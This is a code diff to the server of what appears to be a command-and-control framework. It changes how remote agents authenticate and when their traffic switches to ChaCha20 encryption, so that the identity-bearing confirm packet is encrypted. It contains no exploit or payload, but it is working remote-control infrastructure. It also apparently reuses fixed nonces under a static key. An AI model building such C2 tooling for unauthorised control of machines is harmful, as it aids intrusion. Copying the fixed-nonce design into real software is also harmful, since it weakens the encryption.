@@ -4,8 +4,9 @@ For each connection:
 1. Read the first packet - must be a ``register`` control packet that
    carries ONLY a random nonce (no identity before authentication).
 2. Reply with ``register_response`` = ``sha256(nonce + auth_token)``.
-3. Wait for ``register_confirm`` which now carries the Agent identity
-   (agent_id, hostname, os); only then add the Agent to AgentRegistry.
+3. Wait for ``register_confirm`` (the first packet of the ENCRYPTED Agent -> C2
+   stream) which carries the Agent identity (agent_id, hostname, os); only
+   then add the Agent to AgentRegistry.
 4. Start a per-connection reader task that dispatches packets to:
    - heartbeat / disconnect handlers
    - pending Future resolution for action / upload / download responses
@@ -152,8 +153,9 @@ class NetworkServer:
            ``sha256(nonce + c2_auth_tokens)``.
         3. Agent verifies the hash locally; on success it replies with
            ``register_confirm`` now carrying the identity fields
-           (agent_id, hostname, os).
-        4. C2 registers the Agent only after receiving ``register_confirm``.
+           (agent_id, hostname, os). The confirm is the first packet of the
+           encrypted Agent -> C2 stream.
+        4. C2 registers the Agent only after decrypting ``register_confirm``.
         """
         nonce = await self._read_register(reader, pr)
         if nonce is None:
@@ -170,16 +172,21 @@ class NetworkServer:
         except Exception:
             return None
 
-        confirm_info = await self._wait_confirm(reader, pr)
+        # Handshake + auth succeeded: from the register_confirm packet onward
+        # the Agent -> C2 byte stream is encrypted. Create the cipher contexts
+        # now so rx covers the confirm itself and continues seamlessly into
+        # post-handshake traffic.
+        key = derive_key(self._auth_token)
+        tx = ChaCha20(key, NONCE_C2_TO_AGENT)
+        rx = ChaCha20(key, NONCE_AGENT_TO_C2)
+        if pr.buffered:
+            pr.feed(rx.crypt(pr.drain_all()))
+
+        confirm_info = await self._wait_confirm(reader, pr, rx)
         if confirm_info is None:
             return None
         agent_id, hostname, os_name = confirm_info
 
-        # Handshake + auth succeeded: switch the whole byte stream to
-        # ChaCha20 encryption keyed by sha256(c2_auth_tokens).
-        key = derive_key(self._auth_token)
-        tx = ChaCha20(key, NONCE_C2_TO_AGENT)
-        rx = ChaCha20(key, NONCE_AGENT_TO_C2)
         stream = EncryptedStream(reader, writer, tx, rx)
 
         return AgentInfo(
@@ -232,12 +239,14 @@ class NetworkServer:
         self,
         reader: asyncio.StreamReader,
         pr: PacketReader,
+        rx: ChaCha20,
         timeout: float = 30.0,
     ) -> Optional[Tuple[str, str, str]]:
         """Wait for ``register_confirm``; returns ``(agent_id, hostname, os)``.
 
-        The confirm packet (sent only after the Agent verified the challenge)
-        carries the identity fields that were deferred from ``register``.
+        The confirm packet is the first packet of the encrypted Agent -> C2
+        stream (sent only after the Agent verified the challenge), so incoming
+        bytes are decrypted with ``rx`` before packet parsing.
         """
         deadline = time.time() + timeout
         while time.time() < deadline:
@@ -264,7 +273,7 @@ class NetworkServer:
                 return None
             if not chunk:
                 return None
-            pr.feed(chunk)
+            pr.feed(rx.crypt(chunk))
         return None
 
     async def _serve_connection(
@@ -273,7 +282,8 @@ class NetworkServer:
         pr: PacketReader,
         info: AgentInfo,
     ) -> None:
-        stream.absorb_leftover(pr)
+        # No absorb_leftover here: decryption started at the register_confirm
+        # packet (handled in _wait_confirm), so pr only holds decrypted bytes.
         try:
             while True:
                 pkt = pr.next_packet()
